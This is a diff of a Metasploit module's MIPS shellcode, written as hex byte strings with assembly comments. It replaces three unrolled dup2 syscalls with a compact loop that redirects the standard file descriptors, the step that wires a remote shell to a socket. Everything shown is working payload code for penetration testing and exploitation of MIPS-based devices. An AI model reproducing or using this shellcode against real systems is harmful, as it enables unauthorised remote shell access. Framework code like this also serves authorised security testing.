@@ -80,17 +80,13 @@ module Metasploit3
     "\xff\xff\x50\x30" + #     andi    s0,v0,0xffff
     "\x25\x20\x10\x02" + #     or      a0,s0,s0
     "\xfd\xff\x0f\x24" + #     li      t7,-3
-    "\x27\x28\xe0\x01" + #     nor     a1,t7,zero
-    "\xdf\x0f\x02\x24" + #     li      v0,4063 ( __NR_dup2 )
-    "\x0c\x01\x01\x01" + #     syscall
-    "\x25\x20\x10\x02" + #     or      a0,s0,s0
-    "\x01\x01\x05\x28" + #     slti    a1,zero,0x0101
-    "\xdf\x0f\x02\x24" + #     li      v0,4063 ( __NR_dup2 )
-    "\x0c\x01\x01\x01" + #     syscall
-    "\x25\x20\x10\x02" + #     or      a0,s0,s0
-    "\xff\xff\x05\x28" + #     slti    a1,zero,-1
-    "\xdf\x0f\x02\x24" + #     li      v0,4063 ( __NR_dup2 )
-    "\x0c\x01\x01\x01" + #     syscall
+    "\x27\x78\xe0\x01" + #     nor     t7,t7,zero
+    "\x21\x28\xe0\x01" + #     move    a1,t7   # dup2_loop
+    "\xdf\x0f\x02\x24" + #     li      v0,4063 # sys_dup2
+    "\x0c\x01\x01\x01" + #     syscall 0x40404
+    "\xff\xff\x10\x24" + #     li      s0,-1
+    "\xff\xff\xef\x21" + #     addi    t7,t7,-1
+    "\xfa\xff\xf0\x15" + #     bne     t7,s0,dup2_loop
     "\x50\x73\x06\x24" + #     li      a2,0x7350
     "\xff\xff\xd0\x04" + # LB: bltzal  a2,LB
     "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
